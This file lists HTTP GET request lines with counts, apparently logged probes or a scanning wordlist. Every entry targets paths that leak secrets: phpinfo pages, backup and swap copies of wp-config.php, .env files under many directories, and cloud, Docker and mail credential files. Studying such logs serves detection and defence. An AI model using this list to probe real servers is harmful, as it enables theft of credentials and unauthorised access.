GET /local-info.php HTTP/1.1,1
GET /administrator/phpinfo.php HTTP/1.1,1
GET /admin/info.php HTTP/1.1,1
GET /phpinfo/php-details.php HTTP/1.1,1
GET /php1.php HTTP/1.1,1
GET /php_info.php HTTP/1.1,1
GET /linusadmin-phpinfo.php HTTP/1.1,1
GET /lindex.php HTTP/1.1,1
GET /sysinfo/tabs/php-info.php HTTP/1.1,1
GET /phpsysinfo/phpsysinfo.php HTTP/1.1,1
GET /phpsysinfo/phpinfo.php HTTP/1.1,1
GET /phpsysinfo/info.php HTTP/1.1,1
GET /php/phpinfo.php HTTP/1.1,1
GET /phpinfo/phpinfo.php HTTP/1.1,1
GET /php.ini HTTP/1.1,1
GET /php-info/phpinfo.php HTTP/1.1,1
GET /php-info/phpinfo HTTP/1.1,1
GET /php-info/info.php HTTP/1.1,1
GET /phpcustom_info/phpinfo.php HTTP/1.1,1
GET /php52/phpinfo.php HTTP/1.1,1
GET /apache.php HTTP/1.1,1
GET /apache/i.php HTTP/1.1,1
GET /dashboard/phpinfo.php HTTP/1.1,1
GET /dashboard/phpinfo HTTP/1.1,1
GET /dashboard/info.php HTTP/1.1,1
GET /dashboard/i.php HTTP/1.1,1
GET /dashboard/admin/phpinfo.php HTTP/1.1,1
GET /dashboard/admin/phpinfo HTTP/1.1,1
GET /phpinformation HTTP/1.1,1
GET /dashboard/admin/info.php HTTP/1.1,1
GET /xampp/info.php HTTP/1.1,1
GET /webdav/phpinfo.php HTTP/1.1,1
GET /webdav/phpinfo HTTP/1.1,1
GET /apache2.php HTTP/1.1,1
GET /apache/phpinfo.php HTTP/1.1,1
GET /apache/info.php HTTP/1.1,1
GET /xampp/phpinfo HTTP/1.1,1
GET /dashboard/test.php HTTP/1.1,1
GET /test3.php HTTP/1.1,1
GET /test4.php HTTP/1.1,1
GET /crm/phpinfo.php HTTP/1.1,1
GET /develop/phpinfo.php HTTP/1.1,1
GET /develop/info.php HTTP/1.1,1
GET /dev/phpinfo.php HTTP/1.1,1
GET /dev/info.php HTTP/1.1,1
GET /current/phpinfo.php HTTP/1.1,1
GET /current/info.php HTTP/1.1,1
GET /crm/info.php HTTP/1.1,1
GET /development/phpinfo.php HTTP/1.1,1
GET /backup/phpinfo.php HTTP/1.1,1
GET /backup/info.php HTTP/1.1,1
GET /backend/phpinfo.php HTTP/1.1,1
GET /backend/info.php HTTP/1.1,1
GET /api/phpinfo.php HTTP/1.1,1
GET /api/info.php HTTP/1.1,1
GET /development/iinfo.php HTTP/1.1,1
GET /help/info.php HTTP/1.1,1
GET /wp-config.cache HTTP/1.1,1
GET /laravel/info.php HTTP/1.1,1
GET /laravel/phpinfo.php HTTP/1.1,1
GET /help/phpinfo.php HTTP/1.1,1
GET /helper/info.php HTTP/1.1,1
GET /helper/phpinfo.php HTTP/1.1,1
GET /lara/info.php HTTP/1.1,1
GET /lara/phpinfo.php HTTP/1.1,1
GET /laravel8/phpinfo.php HTTP/1.1,1
GET /service/phpinfo.php HTTP/1.1,1
GET /services/phpinfo.php HTTP/1.1,1
GET /laravel9/phpinfo.php HTTP/1.1,1
GET /laravel10/phpinfo.php HTTP/1.1,1
GET /server/info.php HTTP/1.1,1
GET /server/phpinfo.php HTTP/1.1,1
GET /service/info.php HTTP/1.1,1
GET /services/info.php HTTP/1.1,1
GET /xampp/phpinfo.php HTTP/1.1,1
GET /wp-config. HTTP/1.1,1
GET /scripts/index.php HTTP/1.1,1
GET /console/phpinfo.php HTTP/1.1,1
GET /console/info.php HTTP/1.1,1
GET /channel/team/phpinfo.php HTTP/1.1,1
GET /scripts/phpinfo.php HTTP/1.1,1
GET /scripts/phpinfo HTTP/1.1,1
GET /scripts/info.php HTTP/1.1,1
GET /tools/phpinfo.php HTTP/1.1,1
GET /wp-config-backup.php HTTP/1.1,1
GET /tools/phpinfo HTTP/1.1,1
GET /tools/info.php HTTP/1.1,1
GET /root/phpinfo.php HTTP/1.1,1
GET /root/infophp HTTP/1.1,1
GET /root/info.php HTTP/1.1,1
GET /forum/phpinfo.php HTTP/1.1,1
GET /webdav/info.php HTTP/1.1,1
GET /~cats/php/info.php HTTP/1.1,1
GET /~cats/php/phpinfo HTTP/1.1,1
GET /wp-config-sample.php~ HTTP/1.1,1
GET /wp-config-sample.php.bak HTTP/1.1,1
GET /wp-config-sample.php HTTP/1.1,1
GET /wp-config-sample.bak HTTP/1.1,1
GET /wp-config-good HTTP/1.1,1
GET /wp-config-backup1.txt HTTP/1.1,1
GET /forum/info.php HTTP/1.1,1
GET /wp-config-backup.txt HTTP/1.1,1
GET /wp-config-backup HTTP/1.1,1
GET /wp-config HTTP/1.1,1
GET /File/PHP/phpinfo.php HTTP/1.1,1
GET /File/PHP/phpinfo HTTP/1.1,1
GET /File/PHP/info.php HTTP/1.1,1
GET /~cats/php/phpinfo.php HTTP/1.1,1
GET /wp-config.0 HTTP/1.1,1
GET /wp-config.1 HTTP/1.1,1
GET /wp-config.2 HTTP/1.1,1
GET /wp-config.8 HTTP/1.1,1
GET /wp-config.9 HTTP/1.1,1
GET /wp-config.3 HTTP/1.1,1
GET /wp-config.4 HTTP/1.1,1
GET /wp-config.5 HTTP/1.1,1
GET /wp-config.6 HTTP/1.1,1
GET /wp-config.7 HTTP/1.1,1
GET /wp-config.ORG HTTP/1.1,1
GET /wp-config.dev HTTP/1.1,1
GET /wp-config.b HTTP/1.1,1
GET /wp-config._1 HTTP/1.1,1
GET /wp-config._2 HTTP/1.1,1
GET /wp-config._backup HTTP/1.1,1
GET /wp-config.a HTTP/1.1,1
GET /wp-config.aws HTTP/1.1,1
GET /dashboardadmin/phpinfo.php HTTP/1.1,1
GET /wp-config.bac HTTP/1.1,1
GET /wp-config.backup HTTP/1.1,1
GET /wp-config.data HTTP/1.1,1
GET /wp-config.cust HTTP/1.1,1
GET /wp-config.csproj HTTP/1.1,1
GET /wp-config.cs HTTP/1.1,1
GET /wp-config.conf HTTP/1.1,1
GET /wp-config.com HTTP/1.1,1
GET /wp-config.back HTTP/1.1,1
GET /wp-config.cfg HTTP/1.1,1
GET /wp-config.c HTTP/1.1,1
GET /wp-config.bkp HTTP/1.1,1
GET /wp-config.bk HTTP/1.1,1
GET /wp-config.bak1 HTTP/1.1,1
GET /wp-config.bak HTTP/1.1,1
GET /wp-config.backup.txt HTTP/1.1,1
GET /wp-config.azure HTTP/1.1,1
GET /wp-config.dif HTTP/1.1,1
GET /wp-config.dump HTTP/1.1,1
GET /wp-config.ini HTTP/1.1,1
GET /wp-config.maj HTTP/1.1,1
GET /wp-config.lst HTTP/1.1,1
GET /wp-config.log HTTP/1.1,1
GET /wp-config.local.php HTTP/1.1,1
GET /wp-config.local HTTP/1.1,1
GET /wp-config.java HTTP/1.1,1
GET /wp-config.inc HTTP/1.1,1
GET /wp-config.disabled HTTP/1.1,1
GET /wp-config.in HTTP/1.1,1
GET /wp-config.html HTTP/1.1,1
GET /wp-config.htm HTTP/1.1,1
GET /wp-config.gz HTTP/1.1,1
GET /wp-config.good HTTP/1.1,1
GET /wp-config.err HTTP/1.1,1
GET /wp-config.map HTTP/1.1,1
GET /wp-config.new HTTP/1.1,1
GET /wp-config.php-save HTTP/1.1,1
GET /wp-config.php-original HTTP/1.1,1
GET /wp-config.php-old HTTP/1.1,1
GET /wp-config.php-o HTTP/1.1,1
GET /wp-config.php-n HTTP/1.1,1
GET /wp-config.php-bak HTTP/1.1,1
GET /wp-config.dist HTTP/1.1,1
GET /wp-config.php- HTTP/1.1,1
GET /wp-config.part HTTP/1.1,1
GET /wp-config.original HTTP/1.1,1
GET /wp-config.php.0 HTTP/1.1,1
GET /wp-config.org HTTP/1.1,1
GET /wp-config.old.old HTTP/1.1,1
GET /wp-config.old HTTP/1.1,1
GET /wp-config.php HTTP/1.1,1
GET /wp-config.php-work HTTP/1.1,1
GET /ch8-mytodo/.env HTTP/1.1,1
GET /pictures/.env HTTP/1.1,1
GET /wp-config.php.9 HTTP/1.1,1
GET /wp-config.php.backup HTTP/1.1,1
GET /wp-config.php.bac HTTP/1.1,1
GET /wp-config.php.b HTTP/1.1,1
GET /wp-config.php.azure HTTP/1.1,1
GET /wp-config.php.aws HTTP/1.1,1
GET /wp-config.php.a HTTP/1.1,1
GET /wp-config.php.8 HTTP/1.1,1
GET /wp-config.php.bak HTTP/1.1,1
GET /wp-config.php.7 HTTP/1.1,1
GET /wp-config.php.6 HTTP/1.1,1
GET /wp-config.php.5 HTTP/1.1,1
GET /wp-config.php.4 HTTP/1.1,1
GET /wp-config.php.3 HTTP/1.1,1
GET /wp-config.php.2 HTTP/1.1,1
GET /wp-config.php.backup.txt HTTP/1.1,1
GET /wp-config.php.bak1 HTTP/1.1,1
GET /wp-config.prod.php.txt HTTP/1.1,1
GET /wp-config.php.com HTTP/1.1,1
GET /wp-config.php.conf HTTP/1.1,1
GET /wp-config.php.bk HTTP/1.1,1
GET /wp-config.php.bkp HTTP/1.1,1
GET /wp-config.php.c HTTP/1.1,1
GET /wp-config.php.cache HTTP/1.1,1
GET /wp-config.php.cfg HTTP/1.1,1
GET /wp-config.php.cs HTTP/1.1,1
GET /wp-config.php.disabled HTTP/1.1,1
GET /wp-config.php.dump HTTP/1.1,1
GET /wp-config.php.csproj HTTP/1.1,1
GET /wp-config.php.cust HTTP/1.1,1
GET /wp-config.php.data HTTP/1.1,1
GET /wp-config.php.dev HTTP/1.1,1
GET /wp-config.php.dif HTTP/1.1,1
GET /wp-config.php.dist HTTP/1.1,1
GET /wp-config.php.err HTTP/1.1,1
GET /wp-config.php.swn HTTP/1.1,1
GET /wp-config.php.lst HTTP/1.1,1
GET /wp-config.php.orig HTTP/1.1,1
GET /wp-config.php.org HTTP/1.1,1
GET /wp-config.php.old HTTP/1.1,1
GET /wp-config.php.new HTTP/1.1,1
GET /wp-config.php.map HTTP/1.1,1
GET /wp-config.php.maj HTTP/1.1,1
GET /wp-config.php.log HTTP/1.1,1
GET /wp-config.php.save HTTP/1.1,1
GET /wp-config.php.local HTTP/1.1,1
GET /wp-config.php.java HTTP/1.1,1
GET /wp-config.php.ini HTTP/1.1,1
GET /wp-config.php.inc HTTP/1.1,1
GET /wp-config.php.in HTTP/1.1,1
GET /wp-config.php.html HTTP/1.1,1
GET /wp-config.php.original HTTP/1.1,1
GET /wp-config.php.part HTTP/1.1,1
GET /wp-config.php.php-bak HTTP/1.1,1
GET /wp-config.php.sublime-workspace HTTP/1.1,1
GET /wp-config.php.sublime-project HTTP/1.1,1
GET /wp-config.php.staging HTTP/1.1,1
GET /wp-config.php.stage HTTP/1.1,1
GET /wp-config.php.save.3 HTTP/1.1,1
GET /wp-config.php.save.2 HTTP/1.1,1
GET /wp-config.php.gz HTTP/1.1,1
GET /wp-config.php.save.1 HTTP/1.1,1
GET /wp-config.php.sav HTTP/1.1,1
GET /wp-config.php.sass-cache HTTP/1.1,1
GET /wp-config.php.sample HTTP/1.1,1
GET /wp-config.php.rej HTTP/1.1,1
GET /wp-config.php.production HTTP/1.1,1
GET /wp-config.php.prod HTTP/1.1,1
GET /wp-config.php.swo HTTP/1.1,1
GET /wp-config.php.swp HTTP/1.1,1
GET /wp-config.php.tar HTTP/1.1,1
GET /wp-config.php.uk HTTP/1.1,1
GET /wp-config.php.un~ HTTP/1.1,1
GET /wp-config.php.tar.gz HTTP/1.1,1
GET /wp-config.php.temp HTTP/1.1,1
GET /wp-config.php.templ HTTP/1.1,1
GET /wp-config.php.tmp HTTP/1.1,1
GET /wp-config.php.txt HTTP/1.1,1
GET /wp-config.php.us HTTP/1.1,1
GET /wp-config.php_old2005 HTTP/1.1,1
GET /wp-config.php2 HTTP/1.1,1
GET /wp-config.php.vb HTTP/1.1,1
GET /wp-config.php.vbproj HTTP/1.1,1
GET /wp-config.php.vi HTTP/1.1,1
GET /wp-config.php.zip HTTP/1.1,1
GET /wp-config.php0 HTTP/1.1,1
GET /wp-config.prod HTTP/1.1,1
GET /wp-config.php3 HTTP/1.1,1
GET /wp-config.php5 HTTP/1.1,1
GET /wp-config.php_old2004 HTTP/1.1,1
GET /wp-config.php_old2003 HTTP/1.1,1
GET /wp-config.php_old HTTP/1.1,1
GET /wp-config.php_new HTTP/1.1,1
GET /wp-config.php_bk HTTP/1.1,1
GET /wp-config.php_bak HTTP/1.1,1
GET /wp-config.php4 HTTP/1.1,1
GET /wp-config.php_backup HTTP/1.1,1
GET /wp-config.php______ HTTP/1.1,1
GET /wp-config.php__ HTTP/1.1,1
GET /wp-config.php_1 HTTP/1.1,1
GET /wp-config.php_ HTTP/1.1,1
GET /wp-config.php= HTTP/1.1,1
GET /wp-config.php6 HTTP/1.1,1
GET /wp-config.php1 HTTP/1.1,1
GET /wp-config.php_old2006 HTTP/1.1,1
GET /wp-config.php_old2009 HTTP/1.1,1
GET /wp-config.php_old2017 HTTP/1.1,1
GET /wp-config.php_old2023 HTTP/1.1,1
GET /wp-config.php_old2022 HTTP/1.1,1
GET /wp-config.php_old2021 HTTP/1.1,1
GET /wp-config.php_old2020 HTTP/1.1,1
GET /wp-config.php_old2019 HTTP/1.1,1
GET /wp-config.php_old2018 HTTP/1.1,1
GET /wp-config.php_old2016 HTTP/1.1,1
GET /wp-config.php_old2007 HTTP/1.1,1
GET /wp-config.php_old2015 HTTP/1.1,1
GET /wp-config.php_old2014 HTTP/1.1,1
GET /wp-config.php_old2013 HTTP/1.1,1
GET /wp-config.php_old2012 HTTP/1.1,1
GET /wp-config.php_old2011 HTTP/1.1,1
GET /wp-config.php_old2010 HTTP/1.1,1
GET /wp-config.php_orig HTTP/1.1,1
GET /wp-config.php_original HTTP/1.1,1
GET /wp-config.php~bk HTTP/1.1,1
GET /wp-config.php~1 HTTP/1.1,1
GET /wp-config.php~ HTTP/1.1,1
GET /wp-config.phptmp HTTP/1.1,1
GET /wp-config.phps HTTP/1.1,1
GET /wp-config.phporiginal HTTP/1.1,1
GET /wp-config.php_old2008 HTTP/1.1,1
GET /wp-config.phpold HTTP/1.1,1
GET /wp-config.phpn HTTP/1.1,1
GET /wp-config.phpd HTTP/1.1,1
GET /wp-config.phpc HTTP/1.1,1
GET /wp-config.phpbak HTTP/1.1,1
GET /wp-config.phpb HTTP/1.1,1
GET /wp-config.phpa HTTP/1.1,1
GET /wp-config.phpnew HTTP/1.1,1
GET /wp-config.php~~~ HTTP/1.1,1
GET /bucoffea/.env HTTP/1.1,1
GET /wp-config.php.1 HTTP/1.1,1
GET /wp-config.save.1 HTTP/1.1,1
GET /wp-config.sublime-workspace HTTP/1.1,1
GET /wp-config.sublime-project HTTP/1.1,1
GET /wp-config.staging HTTP/1.1,1
GET /wp-config.stage HTTP/1.1,1
GET /wp-config.save.3 HTTP/1.1,1
GET /wp-config.save.2 HTTP/1.1,1
GET /wp-config.save HTTP/1.1,1
GET /wp-config.swo HTTP/1.1,1
GET /wp-config.sav HTTP/1.1,1
GET /wp-config.sass-cache HTTP/1.1,1
GET /wp-config.sample HTTP/1.1,1
GET /wp-config.rej HTTP/1.1,1
GET /wp-config.rar HTTP/1.1,1
GET /wp-config.production HTTP/1.1,1
GET /wp-config.swn HTTP/1.1,1
GET /wp-config.swp HTTP/1.1,1
GET /apis/.env.local HTTP/1.1,1
GET /wp-config.txt HTTP/1.1,1
GET /wp-config.uk HTTP/1.1,1
GET /wp-config.tar HTTP/1.1,1
GET /wp-config.tar.gz HTTP/1.1,1
GET /wp-config.temp HTTP/1.1,1
GET /wp-config.templ HTTP/1.1,1
GET /wp-config.tmp HTTP/1.1,1
GET /wp-config.un~ HTTP/1.1,1
GET /wp-config.wp-config.php.swp HTTP/1.1,1
GET /wp-config_backup HTTP/1.1,1
GET /wp-config.us HTTP/1.1,1
GET /wp-config.vb HTTP/1.1,1
GET /wp-config.vbproj HTTP/1.1,1
GET /wp-config.vi HTTP/1.1,1
GET /wp-config.wp-config.php.swo HTTP/1.1,1
GET /wp-config.zip HTTP/1.1,1
GET /wp-config_good HTTP/1.1,1
GET /Passportjs/.env HTTP/1.1,1
GET /.wp-config.swm HTTP/1.1,1
GET /.deployment-config.json HTTP/1.1,1
GET /.cordova/config.json HTTP/1.1,1
GET /backup.wp-config.php HTTP/1.1,1
GET /.wp-config.swp HTTP/1.1,1
GET /.wp-config.swo HTTP/1.1,1
GET /.wp-config.swn HTTP/1.1,1
GET /.wp-config.php.swp HTTP/1.1,1
GET /.vscode/.env HTTP/1.1,1
GET /.wp-config.php.swo HTTP/1.1,1
GET /.wp-config.php.swn HTTP/1.1,1
GET /.wp-config.php.swm HTTP/1.1,1
GET /._wp-config.php HTTP/1.1,1
GET /wp.php HTTP/1.1,1
GET /wp-config~ HTTP/1.1,1
GET /.docker/config.json HTTP/1.1,1
GET /.docker/daemon.json HTTP/1.1,1
GET /.docker/laravel/app/.env HTTP/1.1,1
GET /Library/.env HTTP/1.1,1
GET /Kubernetes/.env HTTP/1.1,1
GET /InstantCV/server/.env HTTP/1.1,1
GET /Imagebord/.env HTTP/1.1,1
GET /Helmetjs/.env HTTP/1.1,1
GET /Hash/.env HTTP/1.1,1
GET /wp-configbak HTTP/1.1,1
GET /HUNIV_migration/.env HTTP/1.1,1
GET /.travis.yml HTTP/1.1,1
GET /.s3cfg HTTP/1.1,1
GET /.jupyter/jupyter_notebook_config.json HTTP/1.1,1
GET /.msmtprc HTTP/1.1,1
GET /.lanproxy/config.json HTTP/1.1,1
GET /.gitlab-ci/.env HTTP/1.1,1
GET /Serve_time_server/.env HTTP/1.1,1
GET /Server_with_db/.env HTTP/1.1,1
GET /Simple_server/.env HTTP/1.1,1
GET /User_info/.env HTTP/1.1,1
GET /Web/siteMariage/.env HTTP/1.1,1
GET /Socketio/.env HTTP/1.1,1
GET /Sources/API/.env HTTP/1.1,1
GET /SpotiApps/.env HTTP/1.1,1
GET /Tests/Application/.env HTTP/1.1,1
GET /Travel_form/.env HTTP/1.1,1
GET /acme-challenge/.env HTTP/1.1,1
GET /app/code/community/Nosto/Tagging/.env HTTP/1.1,1
GET /admin/.env.staging HTTP/1.1,1
GET /acme/.env HTTP/1.1,1
GET /acme_challenges/.env HTTP/1.1,1
GET /actions-server/.env HTTP/1.1,1
GET /admin-app/.env HTTP/1.1,1
GET /admin/.env.local HTTP/1.1,1
GET /wp-config.prod.txt HTTP/1.1,1
GET /adminer/.env HTTP/1.1,1
GET /alpha/.env HTTP/1.1,1
GET /app/client/.env HTTP/1.1,1
GET /app/.env.staging HTTP/1.1,1
GET /app/.env.production HTTP/1.1,1
GET /app/.env.local HTTP/1.1,1
GET /app-order-client/.env HTTP/1.1,1
GET /apis/.env.staging HTTP/1.1,1
GET /agora/.env HTTP/1.1,1
GET /apis/.env.production HTTP/1.1,1
GET /apis/.env HTTP/1.1,1
GET /api/src/.env HTTP/1.1,1
GET /api/.env.staging HTTP/1.1,1
GET /api/.env.production HTTP/1.1,1
GET /api/.env.local HTTP/1.1,1
GET /anaconda/.env HTTP/1.1,1
GET /admin/.env.production HTTP/1.1,1
GET /app/config.yml HTTP/1.1,1
GET /app1-static/.env HTTP/1.1,1
GET /back-end/app/.env HTTP/1.1,1
GET /backup/.env HTTP/1.1,1
GET /backendfinaltest/.env HTTP/1.1,1
GET /backend/src/.env HTTP/1.1,1
GET /backend/.env.staging HTTP/1.1,1
GET /backend/.env.production HTTP/1.1,1
GET /backend/.env.local HTTP/1.1,1
GET /awstats/.env HTTP/1.1,1
GET /app/config/dev/.env HTTP/1.1,1
GET /aws-secret.yaml HTTP/1.1,1
GET /asset_img/.env HTTP/1.1,1
GET /apps/client/.env HTTP/1.1,1
GET /app_nginx_static_path/.env HTTP/1.1,1
GET /app_dir/.env HTTP/1.1,1
GET /app2-static/.env HTTP/1.1,1
GET /backup/.env.local HTTP/1.1,1
GET /backup/.env.production HTTP/1.1,1
GET /bootstrap/.env HTTP/1.1,1
GET /bookchain-client/.env HTTP/1.1,1
GET /blue/.env HTTP/1.1,1
GET /blob/.env HTTP/1.1,1
GET /blankon/.env HTTP/1.1,1
GET /bitcoind/.env HTTP/1.1,1
GET /app/frontend/.env HTTP/1.1,1
GET /bgoldd/.env HTTP/1.1,1
GET /beta/.env.production HTTP/1.1,1
GET /beta/.env.local HTTP/1.1,1
GET /beta/.env HTTP/1.1,1
GET /basic-network/.env HTTP/1.1,1
GET /base_dir/.env HTTP/1.1,1
GET /backup/.env.staging HTTP/1.1,1
GET /beta/.env.staging HTTP/1.1,1
GET /wp-config.php__olds HTTP/1.1,1
GET /build/.env HTTP/1.1,1
GET /docker/database/.env HTTP/1.1,1
GET /ch8b-mytodo/.env HTTP/1.1,1
GET /chiminey/.env HTTP/1.1,1
GET /check.php HTTP/1.1,1
GET /chat-client/.env HTTP/1.1,1
GET /charts/liveObjects/.env HTTP/1.1,1
GET /challenges/.env HTTP/1.1,1
GET /challenge/.env HTTP/1.1,1
GET /ch8a-mytodo/.env HTTP/1.1,1
GET /client/.env.local HTTP/1.1,1
GET /playground/.env HTTP/1.1,1
GET /ch7a-mytodo/.env HTTP/1.1,1
GET /ch7-mytodo/.env HTTP/1.1,1
GET /ch6a-mytodo/.env HTTP/1.1,1
GET /ch6-mytodo/.env HTTP/1.1,1
GET /ch2-mytodo/.env HTTP/1.1,1
GET /client-app/.env HTTP/1.1,1
GET /client/.env.production HTTP/1.1,1
GET /front-end/.env HTTP/1.1,1
GET /code/web/.env HTTP/1.1,1
GET /codenames-frontend/.env HTTP/1.1,1
GET /client/.env.staging HTTP/1.1,1
GET /client/mutual-fund-app/.env HTTP/1.1,1
GET /client/src/.env HTTP/1.1,1
GET /clld_dir/.env HTTP/1.1,1
GET /code/api/.env HTTP/1.1,1
GET /collected_static/.env HTTP/1.1,1
GET /configuration.php HTTP/1.1,1
GET /console/payments/config.json HTTP/1.1,1
GET /community/.env HTTP/1.1,1
GET /config.env HTTP/1.1,1
GET /config/cache.php HTTP/1.1,1
GET /config/config.js HTTP/1.1,1
GET /config/secrets.yml HTTP/1.1,1
GET /console/base/config.json HTTP/1.1,1
GET /core/persistence/.env HTTP/1.1,1
GET /dev/.env HTTP/1.1,1
GET /cryo_project/.env HTTP/1.1,1
GET /custom/.env HTTP/1.1,1
GET /current/.env.staging HTTP/1.1,1
GET /current/.env.production HTTP/1.1,1
GET /current/.env.local HTTP/1.1,1
GET /current/.env HTTP/1.1,1
GET /css/.env HTTP/1.1,1
GET /cron/.env.staging HTTP/1.1,1
GET /demo/.env HTTP/1.1,1
GET /cron/.env.production HTTP/1.1,1
GET /cron/.env.local HTTP/1.1,1
GET /crm/.env.staging HTTP/1.1,1
GET /crm/.env.production HTTP/1.1,1
GET /crm/.env.local HTTP/1.1,1
GET /counterwallet/.env HTTP/1.1,1
GET /d/.env HTTP/1.1,1
GET /data/.env HTTP/1.1,1
GET /database.yml HTTP/1.1,1
GET /dev.php HTTP/1.1,1
GET /deploy/.env HTTP/1.1,1
GET /deploy.php HTTP/1.1,1
GET /dep.php HTTP/1.1,1
GET /demo/.env.staging HTTP/1.1,1
GET /demo/.env.production HTTP/1.1,1
GET /counterblockd/.env HTTP/1.1,1
GET /demo/.env.local HTTP/1.1,1
GET /demo-app/.env HTTP/1.1,1
GET /delivery/.env HTTP/1.1,1
GET /default/.env HTTP/1.1,1
GET /dataset2/.env HTTP/1.1,1
GET /dataset1/.env HTTP/1.1,1
GET /dataset/.env HTTP/1.1,1
GET /dev/.env.local HTTP/1.1,1
GET /dev/.env.production HTTP/1.1,1
GET /dev/.env.staging HTTP/1.1,1
GET /developerslv/.env HTTP/1.1,1
GET /development/.env HTTP/1.1,1
GET /develop/.env HTTP/1.1,1
GET /develop/.env.local HTTP/1.1,1
GET /develop/.env.production HTTP/1.1,1
GET /develop/.env.staging HTTP/1.1,1
GET /developer.php HTTP/1.1,1
GET /development/.env.local HTTP/1.1,1
GET /e2e/.env HTTP/1.1,1
GET /django/.env HTTP/1.1,1
GET /development/.env.production HTTP/1.1,1
GET /development/.env.staging HTTP/1.1,1
GET /devs.php HTTP/1.1,1
GET /directories/.env HTTP/1.1,1
GET /dist/.env HTTP/1.1,1
GET /front-empathy/.env HTTP/1.1,1
GET /django_project_path/.env HTTP/1.1,1
GET /docker-compose/platform/.env HTTP/1.1,1
GET /downloads/.env HTTP/1.1,1
GET /dotfiles/.env HTTP/1.1,1
GET /dodoswap-client/.env HTTP/1.1,1
GET /docker/webdav/.env HTTP/1.1,1
GET /docker/postgres/.env HTTP/1.1,1
GET /docker/examples/compose/.env HTTP/1.1,1
GET /doc/.env HTTP/1.1,1
GET /docker/db/.env HTTP/1.1,1
GET /docker/compose/withPostgres/.env HTTP/1.1,1
GET /docker/compose/withMongo/.env HTTP/1.1,1
GET /docker/app/.env HTTP/1.1,1
GET /docker-node-mongo-redis/.env HTTP/1.1,1
GET /docker-network-healthcheck/.env HTTP/1.1,1
GET /docker-elk/.env HTTP/1.1,1
GET /django-blog/.env HTTP/1.1,1
GET /engine/.env HTTP/1.1,1
GET /env.development.local HTTP/1.1,1
GET /environments/local/.env HTTP/1.1,1
GET /fastlane/.env HTTP/1.1,1
GET /export/.env HTTP/1.1,1
GET /example/.env HTTP/1.1,1
GET /errors/.env HTTP/1.1,1
GET /error/.env HTTP/1.1,1
GET /environments/production/.env HTTP/1.1,1
GET /env/template/.env HTTP/1.1,1
GET /env.backup HTTP/1.1,1
GET /env/phpinfo HTTP/1.1,1
GET /env/example/.env HTTP/1.1,1
GET /env/dockers/php-apache/.env HTTP/1.1,1
GET /env/dockers/mariadb-test/.env HTTP/1.1,1
GET /env.template HTTP/1.1,1
GET /env.js HTTP/1.1,1
GET /favicons/.env HTTP/1.1,1
GET /favs/.env HTTP/1.1,1
GET /fonts/.env HTTP/1.1,1
GET /font-icons/.env HTTP/1.1,1
GET /fm/.env HTTP/1.1,1
GET /flask_test_uploads/.env HTTP/1.1,1
GET /fixtures/kitchensink/.env HTTP/1.1,1
GET /fixtures/flight/.env HTTP/1.1,1
GET /env.config.js HTTP/1.1,1
GET /fixtures/fiber-debugger/.env HTTP/1.1,1
GET /fisdom/fisdom/.env HTTP/1.1,1
GET /first-network/.env HTTP/1.1,1
GET /films/.env HTTP/1.1,1
GET /fileserver/.env HTTP/1.1,1
GET /fhir-api/.env HTTP/1.1,1
GET /fedora.php HTTP/1.1,1
GET /fixtures/blocks/.env HTTP/1.1,1
GET /front-app/.env HTTP/1.1,1
GET /cardea/backend/.env HTTP/1.1,1
GET /cdw-backend/.env HTTP/1.1,1
GET /ftpmaster/.env HTTP/1.1,1
GET /grems-frontend/.env HTTP/1.1,1
GET /grems-api/.env HTTP/1.1,1
GET /github-connect/.env HTTP/1.1,1
GET /gists/pusher/.env HTTP/1.1,1
GET /gists/laravel/.env HTTP/1.1,1
GET /gists/cache/.env HTTP/1.1,1
GET /ftp/.env HTTP/1.1,1
GET /hgs-static/.env HTTP/1.1,1
GET /frontendfinaltest/.env HTTP/1.1,1
GET /frontend/vue/.env HTTP/1.1,1
GET /frontend/react/.env HTTP/1.1,1
GET /frontend/momentum-fe/.env HTTP/1.1,1
GET /frontend/.env HTTP/1.1,1
GET /front/src/.env HTTP/1.1,1
GET /hasura/.env HTTP/1.1,1
GET /higlass-website/.env HTTP/1.1,1
GET /micro-app-react/.env HTTP/1.1,1
GET /http/.env HTTP/1.1,1
GET /httpboot/.env HTTP/1.1,1
GET /home/.env HTTP/1.1,1
GET /horde/.env HTTP/1.1,1
GET /hotpot-app-frontend/.env HTTP/1.1,1
GET /htdocs/.env HTTP/1.1,1
GET /html/.env HTTP/1.1,1
GET /icon/.env HTTP/1.1,1
GET /isadmin.php HTTP/1.1,1
GET /javascript/.env HTTP/1.1,1
GET /ikiwiki/.env HTTP/1.1,1
GET /image_data/.env HTTP/1.1,1
GET /images/.env HTTP/1.1,1
GET /img/.env HTTP/1.1,1
GET /install/.env HTTP/1.1,1
GET /items/.env HTTP/1.1,1
GET /js-plugin/.env HTTP/1.1,1
GET /linux/.env HTTP/1.1,1
GET /kyc/.env HTTP/1.1,1
GET /laravel/.env.staging HTTP/1.1,1
GET /laravel/.env.production HTTP/1.1,1
GET /laravel/.env.local HTTP/1.1,1
GET /kyc/.env.staging HTTP/1.1,1
GET /kyc/.env.production HTTP/1.1,1
GET /kyc/.env.local HTTP/1.1,1
GET /kolab-syncroton/.env HTTP/1.1,1
GET /legacy/tests/9.1.1/.env HTTP/1.1,1
GET /kibana/.env HTTP/1.1,1
GET /khanlinks/.env HTTP/1.1,1
GET /jupyter/.env HTTP/1.1,1
GET /jsrelay/.env HTTP/1.1,1
GET /js/envConfig.js HTTP/1.1,1
GET /js/config.js HTTP/1.1,1
GET /laravel/core/.env HTTP/1.1,1
GET /laravel/core/.env.local HTTP/1.1,1
GET /laravel/core/.env.production HTTP/1.1,1
GET /libs/.env HTTP/1.1,1
GET /letsencrypt/.env HTTP/1.1,1
GET /lemonldap-ng-fr-doc/.env HTTP/1.1,1
GET /lemonldap-ng-doc/.env/ HTTP/1.1,1
GET /lemonldap-ng-doc/.env HTTP/1.1,1
GET /legal/.env HTTP/1.1,1
GET /js/.env HTTP/1.1,1
GET /legacy/tests/9.2.0/.env HTTP/1.1,1
GET /ledger_sync/.env HTTP/1.1,1
GET /leafer-app/.env HTTP/1.1,1
GET /lcomernbootcamp/projbackend/.env HTTP/1.1,1
GET /layout/.env HTTP/1.1,1
GET /latest/.env HTTP/1.1,1
GET /laravel/core/.env.staging HTTP/1.1,1
GET /live/.env HTTP/1.1,1
GET /live/.env.local HTTP/1.1,1
GET /live/.env.production HTTP/1.1,1
GET /mailer/.env HTTP/1.1,1
GET /mailinabox/.env HTTP/1.1,1
GET /live/.env.staging HTTP/1.1,1
GET /log/.env HTTP/1.1,1
GET /logging/.env HTTP/1.1,1
GET /login/.env HTTP/1.1,1
